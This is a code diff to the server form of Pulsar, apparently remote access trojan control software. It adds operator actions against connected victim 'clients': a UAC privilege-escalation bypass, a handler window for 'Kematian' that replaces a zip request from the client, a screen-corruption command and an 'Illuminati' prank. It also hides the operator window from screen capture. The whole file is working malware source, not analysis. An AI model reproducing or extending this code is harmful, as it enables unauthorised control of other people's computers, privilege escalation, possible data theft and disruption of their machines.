@@ -61,6 +61,7 @@ namespace Pulsar.Server.Forms
             RegisterMessageHandler();
             InitializeComponent();
             DarkModeManager.ApplyDarkMode(this);
+			ScreenCaptureHider.ScreenCaptureHider.Apply(this.Handle);
             _discordRpc = new DiscordRPC.DiscordRPC(this);  // Initialize Discord RPC
             _discordRpc.Enabled = Settings.DiscordRPC;     // Sync with settings on startup
 
@@ -442,7 +443,7 @@ namespace Pulsar.Server.Forms
                 var blockedIPs = System.Text.Json.JsonSerializer.Deserialize<List<string>>(json);
                 return blockedIPs.Contains(clientAddress.ToString());
             }
-            catch (Exception ex)
+            catch (Exception)
             {
                 return false;
             }
@@ -1071,6 +1072,26 @@ namespace Pulsar.Server.Forms
             }
         }
 
+        private void uACBypassToolStripMenuItem_Click(object sender, EventArgs e)
+        {
+            var selectedClients = GetSelectedClients();
+            if (selectedClients.Length == 0) return;
+
+            var result = MessageBox.Show(
+                $"Are you sure you want to attempt UAC bypass on {selectedClients.Length} client(s)? If Pulsar is being ran in memory, it will fail and you will loose the client until their computer is restarted or until the client file is rerun.",
+                "Confirm UAC Bypass",
+                MessageBoxButtons.YesNo,
+                MessageBoxIcon.Warning);
+
+            if (result == DialogResult.Yes)
+            {
+                foreach (Client c in selectedClients)
+                {
+                    c.Send(new DoUACBypass());
+                }
+            }
+        }
+
         private void nicknameToolStripMenuItem_Click(object sender, EventArgs e)
         {
             foreach (Client c in GetSelectedClients())
@@ -1331,8 +1352,10 @@ namespace Pulsar.Server.Forms
         {
             foreach (Client c in GetSelectedClients())
             {
-                var kematianHandler = new KematianHandler(c);
-                kematianHandler.RequestKematianZip();
+                var kematianHandler = new Messages.KematianHandler(c);
+                FrmKematian frmK = new FrmKematian(c, kematianHandler);
+                frmK.Show();
+                frmK.Focus();
             }
         }
 
@@ -1474,11 +1497,19 @@ namespace Pulsar.Server.Forms
             }
         }
 
-        private void pixelCorruptToolStripMenuItem_Click(object sender, EventArgs e)
+        private void screenCorruptToolStripMenuItem_Click(object sender, EventArgs e)
         {
             foreach (Client c in GetSelectedClients())
             {
-                c.Send(new DoPixelCorrupt());
+                c.Send(new DoScreenCorrupt());
+            }
+        }
+
+        private void illuminatiToolStripMenuItem_Click(object sender, EventArgs e)
+        {
+            foreach (Client c in GetSelectedClients())
+            {
+                c.Send(new DoIlluminati());
             }
         }
 
@@ -2003,7 +2034,7 @@ namespace Pulsar.Server.Forms
                         string updatedJson = System.Text.Json.JsonSerializer.Serialize(blockedIPs, new JsonSerializerOptions { WriteIndented = true });
                         File.WriteAllText(filePath, updatedJson);
                     }
-                    catch (Exception ex)
+                    catch (Exception)
                     {
                     }
                     c.Send(new DoClientUninstall());
